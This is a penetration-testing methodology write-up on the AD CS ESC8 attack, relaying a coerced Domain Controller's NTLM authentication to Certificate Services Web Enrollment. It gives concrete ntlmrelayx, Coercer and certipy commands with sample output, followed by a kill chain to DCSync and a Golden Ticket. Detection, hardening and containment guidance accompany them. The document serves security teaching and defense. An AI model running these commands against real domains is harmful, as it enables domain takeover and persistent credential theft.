> **English** | [Italiano](README.md)

# AD CS ESC8: NTLM relay to Web Enrollment and domain compromise

> - **Phase:** Credential Access / Privilege Escalation (Active Directory domain)
> - **Visibility:** Medium-High - coercion generates anomalous RPC traffic toward the attacker; certificate issuance leaves a trace in the CA database (a request from an unexpected principal)
> - **Prerequisites:** presence of AD CS with an active HTTP(S) Web Enrollment endpoint (`/certsrv`); a network position allowing an authentication to be coerced (e.g., from a Domain Controller) and relayed; no privileged credentials required for the base scenario
> - **Technique:** `AD CS ESC8` | **Typical severity:** `Critical` | **Finding ID:** to assign in lab (methodology)

- Nature of the document: methodology. Illustrative and representative outputs, not from a specific lab; identifiers (certificates, hashes) truncated or placeholder.
- Objective: obtain a certificate for a privileged account (typically a Domain Controller's machine account) by combining coercion and NTLM relay, and use it to reach the full domain.

---

## Executive Summary

ESC8 is one of the Active Directory Certificate Services misconfigurations catalogued in the "Certified
Pre-Owned" research (Schroeder & Christensen 2021). It combines two independent weaknesses: the AD CS Web
Enrollment endpoint (`http://ca/certsrv/`) accepts NTLM authentication, and NTLM by default does not bind
authentication to the channel on which it occurs (no Extended Protection for Authentication). An attacker in
a network position coerces a privileged account - typically a Domain Controller - to authenticate to them,
then relays that authentication to the CA's HTTP endpoint requesting a certificate on behalf of the victim.

The obtained certificate allows Kerberos authentication via PKINIT as the victim. If the victim is a DC's
machine account, the attacker effectively obtains its privileges, opening the way to DCSync and thus the
full domain. Unlike a compromised password, the certificate stays valid even after the account's password is
reset: hence a persistence that password-based countermeasures do not remove.

## Operational context (why, before how)

ESC8 has become a reference vector because it requires no privileged credentials and exploits components
present in very many domains (AD CS with Web Enrollment is often installed by default or for application
needs). The path is entirely based on legitimate features: coercion uses exposed RPCs (MS-EFSRPC, MS-RPRN),
the relay uses the absence of NTLM binding, certificate issuance uses a valid template.

The main operational decision is which victim to coerce and which template to request. Coercing a DC is the
highest-impact option (it leads directly to the domain secrets), but any privileged machine account can be
useful. The template choice (e.g., one allowing Client Authentication) depends on what the CA exposes.

## Execution / Commands

The base scenario requires three components in sequence: a relay listener pointed at the CA, a coercion
trigger, and finally the use of the obtained certificate.

### Phase 1 - Relay to the AD CS endpoint

```bash
# ntlmrelayx listening: relays the received authentication to the CA Web Enrollment,
# requesting a certificate with a template that allows client authentication
ntlmrelayx.py -t http://ca01.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

### Phase 2 - Coercing the authentication

```bash
# Induces the Domain Controller to authenticate to the attacker's host (which is the relay).
# Multiple coercion vectors exist (MS-EFSRPC, MS-RPRN); use the available one
Coercer coerce -l <ATTACKER_IP> -t <DOMAIN_CONTROLLER_IP> -u utente -p 'Password123' -d corp.local
```

Illustrative output (ntlmrelayx side, representative):

```
[*] Authenticating against http://ca01.corp.local as CORP/DC01$ SUCCEED
[*] GOT CERTIFICATE! ID 1337
[*] Base64 certificate of user DC01$:            <-- certificate for the DC's machine account
MIIR...[TRUNCATED]...==
```

### Phase 3 - Using the certificate (PKINIT)

```bash
# Kerberos authentication with the obtained certificate: returns a TGT for the victim account,
# and can recover the account's NT hash (UnPAC-the-hash)
certipy auth -pfx dc01.pfx -dc-ip 10.10.10.10
```

Illustrative output:

```
[*] Got TGT for 'DC01$@CORP.LOCAL'
[*] Got NT hash for 'DC01$@CORP.LOCAL': <HASH_TRUNCATED>   <-- credentials of the DC's machine account
```

With the DC machine-account credentials, the typical next step is DCSync (see
[05-credential-dumping/dcsync](<../../05-credential-dumping/dcsync/README.en.md>)).

## Analysis of results

The result is not "a password" but a cryptographic identity: a certificate valid for the DC's account. This
changes the nature of the compromise compared to a password theft. First, the certificate authenticates via
PKINIT independently of the password, so it survives its reset. Second, a DC's machine account has, by
definition, replication rights: from here DCSync is immediate. The severity is `Critical` because the
practical outcome, in the DC scenario, is total domain compromise from a network position without privileges.

### Theoretical Analysis

ESC8 is the composition of two violations (see
[THEORETICAL-FOUNDATIONS](<../../THEORETICAL-FOUNDATIONS.en.md>), sections 3.4 and 2). The first is the
violation of property P4 (binding of authentication to the channel): NTLM is a challenge-response protocol
that does not bind the response to the channel, so a relay reuses it identically toward a different target.
The second is the violation of property P3 (confinement of authority): the CA issues a certificate on behalf
of the authenticated principal without distinguishing a direct authentication from a relayed one, and Web
Enrollment accepts NTLM. Coercion (T1187) is the engine that provides the relay with a privileged
authentication to reuse.

The choice to coerce a DC rather than another account depends on the objective: the DC maximizes impact
because it leads directly to replication rights. In environments where Web Enrollment is exposed over HTTPS
with Channel Binding (EPA) enabled, the relay fails: and this is exactly the countermeasure theoretically
foreseen by property P4.

## Remediation (Blue Team)

**Detection (SOC/SIEM).**

- Certificate requests in the CA database issued for machine accounts (e.g., a DC) in unexpected contexts: a
  DC does not normally request certificates via HTTP Web Enrollment.
- Coercion traffic: MS-EFSRPC/MS-RPRN RPC calls from and to unexpected hosts; authentication events followed
  by HTTP requests to `/certsrv`.
- NTLM authentications toward the CA endpoint coming from hosts that are not legitimate enrollment clients.

**Hardening.**

- Enable Extended Protection for Authentication (EPA) and require HTTPS on the Web Enrollment endpoint: it
  binds authentication to the TLS channel and neutralizes the relay (a direct countermeasure to P4).
- Disable NTLM on the AD CS endpoint, or remove the Web Enrollment role if unnecessary.
- Mitigate coercion: patch and harden the exploitable RPC services, filter unnecessary RPC traffic toward the
  DCs.
- Enable SMB/LDAP signing at the domain level as defense in depth against relay.

---

## Real-World Scenario: Post-Exploitation Projection

> How ESC8 would fit into a real engagement, from the attacker's and the defender's perspective.

### Attacker Perspective (Red Team)

**Starting point:** internal network position; AD CS with HTTP Web Enrollment identified; no privileged
credentials.

**Immediate next step:** start the relay to the CA and coerce the DC's authentication to obtain a certificate
in its name.

**Projected Kill Chain:**

```
Network position (no privileges)
        |
        v
Coercion of the DC (MS-EFSRPC/MS-RPRN) + NTLM relay to /certsrv (ESC8)
        |
        v
Certificate for the DC's machine account -> PKINIT -> DC's NT hash
        |
        v
DCSync -> dump of all domain hashes, including krbtgt
        |
        v
Golden Ticket -> domain persistence; the certificate stays valid even after a password reset
```

**Potential impact:** total domain compromise starting from a mere network presence. The certificate-based
persistence is particularly insidious because it survives password resets.

**Typical monetization vectors:** enterprise ransomware downstream of domain control; massive data
exfiltration with domain privileges; access brokering of the obtained Domain Admin access.

### Defender Perspective (Blue Team)

**Detection:** certificate requests for privileged machine accounts from unexpected channels; spikes of RPC
coercion; NTLM authentications toward `/certsrv` from illegitimate sources.

**Indicators of Compromise (IOC):** CA database entry: certificate issued for `DC01$` (or another privileged
account) via Web Enrollment; MS-EFSRPC/MS-RPRN traffic toward the DCs from non-administrative hosts;
subsequent use of PKINIT from an unexpected host followed by replication activity (DCSync).

**Containment:** revoke the anomalously issued certificate; isolate the relay host; reset krbtgt (twice) if a
Golden Ticket is suspected; investigate recent replications.

**Eradication and hardening:** EPA + HTTPS on Web Enrollment, or role removal; disable NTLM toward the CA;
mitigate coercion; SMB/LDAP signing.

**Defensive lesson:** authentication not bound to the channel (NTLM without EPA) is a systemic risk when a
sensitive service like the CA accepts it. The defense is not "making NTLM stronger" but binding
authentication to the channel and confining the certificate-issuance authority.

---

## Reference tools

| Tool | Type | Technique/Access | Main use case |
| :--- | :--- | :--- | :--- |
| `Certipy` | AD CS toolkit | CLI - Active | AD CS enumeration, ESC identification, PKINIT authentication with a certificate |
| `ntlmrelayx.py` (Impacket) | Relay toolkit | CLI - Active | Relay of NTLM authentication to the CA Web Enrollment (`--adcs`) |
| `Coercer` | Coercion toolkit | CLI - Active | Multi-protocol coercion of authentication (MS-EFSRPC, MS-RPRN, ...) |
| `PetitPotam` | Coercion PoC | CLI - Active | Coercion via MS-EFSRPC, classic vector paired with ESC8 |
| `Certify` | .NET AD CS tool | CLI - Active | AD CS enumeration and abuse from a Windows host |
| `Rubeus` | .NET Kerberos tool | CLI - Active | Use of the certificate to request a TGT (PKINIT) from Windows |

---

## Methodology notes

In a real lab (e.g., GOAD, which includes AD CS scenarios) the points to document as a finding would be:
which coercion vector works against the DC's configuration, which template the CA exposes as exploitable, and
the PKINIT outcome (TGT and/or NT hash). You should also verify whether EPA/HTTPS are enabled, because they
determine the failure or success of the relay. Once observed, these outcomes become the real finding
(`AD-NNN`).

## MITRE ATT&CK mapping

| Tactic | Technique | MITRE ID | Action Description |
| :--- | :--- | :--- | :--- |
| Credential Access | Steal or Forge Authentication Certificates | `T1649` | Obtaining an authentication certificate on behalf of a privileged account via AD CS. |
| Credential Access | Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay | `T1557.001` | Relay of the coerced NTLM authentication to the Web Enrollment endpoint. |
| Credential Access | Forced Authentication | `T1187` | Coercion of the Domain Controller to authenticate to the relay host (MS-EFSRPC/MS-RPRN). |
| Credential Access | OS Credential Dumping: DCSync | `T1003.006` | Follow-on: use of the DC's credentials for abused replication. |

---

## Links to other modules

| Source | This technique | Effect |
| :--- | :--- | :--- |
| Internal network position / recon ([01-recon](<../../../01-recon (Red Team Basic)/README.en.md>)) | ESC8 | identification of the AD CS endpoint and the DCs to coerce |
| ESC8 | [DCSync](<../../05-credential-dumping/dcsync/README.en.md>) | the obtained DC credentials enable abused replication |
| ESC8 | generic NTLM relay (module 07 / network techniques) | same relay primitive applied to a high-value target (the CA) |

---

> **Note:** All described techniques are for educational and methodology-documentation purposes. Execution only in owned labs or with explicit authorization. Illustrative outputs, not from real systems.
